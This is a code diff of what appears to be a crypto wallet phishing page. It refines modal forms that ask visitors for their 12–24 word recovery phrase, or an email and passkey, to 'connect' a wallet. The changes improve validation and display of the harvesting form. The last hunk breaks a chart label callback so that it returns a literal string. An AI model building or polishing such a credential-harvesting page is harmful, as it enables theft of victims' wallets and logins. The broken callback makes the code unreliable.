@@ -238,7 +238,7 @@
     </div>
 
     <!-- Form Modal -->
-    <div id="formModalOverlay" class="fixed inset-0 bg-black bg-opacity-50 z-70 hidden flex items-center justify-center p-4">
+    <div id="formModalOverlay" class="fixed inset-0 bg-black bg-opacity-50 z-[9999] hidden flex items-center justify-center p-4">
         <div class="bg-white rounded-2xl w-full max-w-md relative animate-fade-in max-h-[90vh] overflow-y-auto">
             <button id="closeFormModal" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors z-10">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -252,7 +252,7 @@
                     <p class="text-gray-600 text-sm" id="formDescription">Please enter your recovery phrase to connect your wallet</p>
                 </div>
 
-                <form id="authForm">
+                <form id="authForm" novalidate>
                     <div id="phraseForm" class="hidden">
                         <div class="mb-4">
                             <label class="block text-sm font-medium text-gray-700 mb-2">Recovery Phrase</label>
@@ -260,9 +260,8 @@
                                 id="recoveryPhrase" 
                                 name="recoveryPhrase"
                                 rows="4" 
-                                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent resize-none"
+                                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500  resize-none"
                                 placeholder="Enter your 12-24 word recovery phrase separated by spaces"
-                                required
                             ></textarea>
                         </div>
                     </div>
@@ -276,7 +275,6 @@
                                 name="passkeyEmail"
                                 class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                                 placeholder="Enter your email address"
-                                required
                             />
                         </div>
                         <div class="mb-4">
@@ -287,7 +285,6 @@
                                 name="passkey"
                                 class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                                 placeholder="Enter your passkey"
-                                required
                             />
                         </div>
                     </div>
@@ -300,7 +297,7 @@
                     <button 
                         type="submit" 
                         id="submitBtn"
-                        class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                        class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg font-medium transition-colors"
                     >
                         <span id="submitText">Connect Wallet</span>
                         <span id="loadingSpinner" class="hidden">
@@ -644,6 +641,12 @@
             formDescription.textContent = 'Please enter your recovery phrase to connect your wallet';
             phraseForm.classList.remove('hidden');
             passkeyForm.classList.add('hidden');
+            
+            // Make sure the recovery phrase field is focusable and required
+            document.getElementById('recoveryPhrase').setAttribute('required', '');
+            document.getElementById('passkeyEmail').removeAttribute('required');
+            document.getElementById('passkey').removeAttribute('required');
+            
             authModalOverlay.classList.add('hidden');
             formModalOverlay.classList.remove('hidden');
         });
@@ -654,28 +657,59 @@
             formDescription.textContent = 'Please enter your email and passkey to connect your wallet';
             passkeyForm.classList.remove('hidden');
             phraseForm.classList.add('hidden');
+            
+            // Make sure the passkey fields are focusable and required
+            document.getElementById('passkeyEmail').setAttribute('required', '');
+            document.getElementById('passkey').setAttribute('required', '');
+            document.getElementById('recoveryPhrase').removeAttribute('required');
+            
             authModalOverlay.classList.add('hidden');
             formModalOverlay.classList.remove('hidden');
         });
+
+        // Custom form validation
+        function validateForm() {
+            if (currentAuthMethod === 'phrase') {
+                const phrase = document.getElementById('recoveryPhrase').value.trim();
+                if (!phrase || phrase.split(' ').length < 12) {
+                    alert('Please enter a valid recovery phrase (12-24 words)');
+                    document.getElementById('recoveryPhrase').focus();
+                    return false;
+                }
+            } else if (currentAuthMethod === 'passkey') {
+                const email = document.getElementById('passkeyEmail').value.trim();
+                const passkey = document.getElementById('passkey').value.trim();
+                
+                if (!email) {
+                    alert('Please enter your email address');
+                    document.getElementById('passkeyEmail').focus();
+                    return false;
+                }
+                
+                // Basic email validation
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    alert('Please enter a valid email address');
+                    document.getElementById('passkeyEmail').focus();
+                    return false;
+                }
+                
+                if (!passkey) {
+                    alert('Please enter your passkey');
+                    document.getElementById('passkey').focus();
+                    return false;
+                }
+            }
+            return true;
+        }
 
         // Form submission
         authForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            // Validate inputs
-            if (currentAuthMethod === 'phrase') {
-                const phrase = document.getElementById('recoveryPhrase').value;
-                if (!phrase || phrase.split(' ').length < 12) {
-                    alert('Please enter a valid recovery phrase (12-24 words)');
-                    return;
-                }
-            } else {
-                const email = document.getElementById('passkeyEmail').value;
-                const passkey = document.getElementById('passkey').value;
-                if (!email || !passkey) {
-                    alert('Please enter both email and passkey');
-                    return;
-                }
+            // Custom validation
+            if (!validateForm()) {
+                return;
             }
             
             // Show loading state
@@ -737,6 +771,12 @@
             successMessage.classList.add('hidden');
             phraseForm.classList.add('hidden');
             passkeyForm.classList.add('hidden');
+            
+            // Clear required attributes
+            document.getElementById('recoveryPhrase').removeAttribute('required');
+            document.getElementById('passkeyEmail').removeAttribute('required');
+            document.getElementById('passkey').removeAttribute('required');
+            
             currentWallet = '';
             currentAuthMethod = '';
         }
@@ -797,7 +837,7 @@
                         max: 0.4,
                         ticks: {
                             callback: function(value) {
-                                return '$' + value.toFixed(5);
+                                return ' + value.toFixed(5)';
                             }
                         },
                         grid: {
